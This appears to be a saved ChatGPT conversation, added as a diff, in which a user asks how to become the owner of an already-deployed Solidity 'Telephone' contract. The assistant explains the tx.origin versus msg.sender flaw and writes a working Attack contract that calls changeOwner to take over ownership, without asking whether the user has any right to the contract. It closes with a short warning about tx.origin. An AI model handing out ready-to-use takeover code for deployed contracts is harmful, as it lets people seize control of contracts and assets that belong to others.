@@ -1,0 +1,48 @@
+User
+
+How could I became the owner of this contract whic is already deployed?
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract Telephone {
+
+  address public owner;
+
+  constructor() {
+    owner = msg.sender;
+  }
+
+  function changeOwner(address _owner) public {
+    if (tx.origin != msg.sender) {
+      owner = _owner;
+    }
+  }
+}
+ChatGPT
+
+The contract you've posted, named "Telephone", contains a changeOwner function which changes the contract's owner state variable to a new owner, but only if the transaction origin (tx.origin) is not the message sender (msg.sender).
+
+In Solidity, msg.sender is the address of the entity (contract or externally owned account) directly interacting with the contract, while tx.origin is the original address that started the transaction. This means that if a contract calls another contract, msg.sender will be the address of the calling contract, but tx.origin will still be the address of the externally owned account (EOA) that initiated the transaction.
+
+This condition tx.origin != msg.sender will be true when a contract is calling the changeOwner function, not an EOA. Therefore, to become the owner of this contract, you'll need to create a separate contract that calls changeOwner method of this Telephone contract. Here is an example:
+
+solidity
+
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract Attack {
+    Telephone public telephone;
+
+    constructor(Telephone _telephone) {
+        telephone = _telephone;
+    }
+
+    function attack(address _owner) public {
+        telephone.changeOwner(_owner);
+    }
+}
+
+In this example, you deploy the Attack contract and call the attack function with the desired new owner address as a parameter. The attack function will call changeOwner in the Telephone contract, and since tx.origin (the address of the EOA that started the transaction) will be different from msg.sender (the address of the Attack contract), the owner will be changed to the new address.
+
+Of course, it's worth noting that this kind of programming is a significant security issue. The changeOwner function can be exploited by any contract that interacts with this one, and generally, the use of tx.origin is discouraged in modern Solidity programming due to the potential for such security issues.
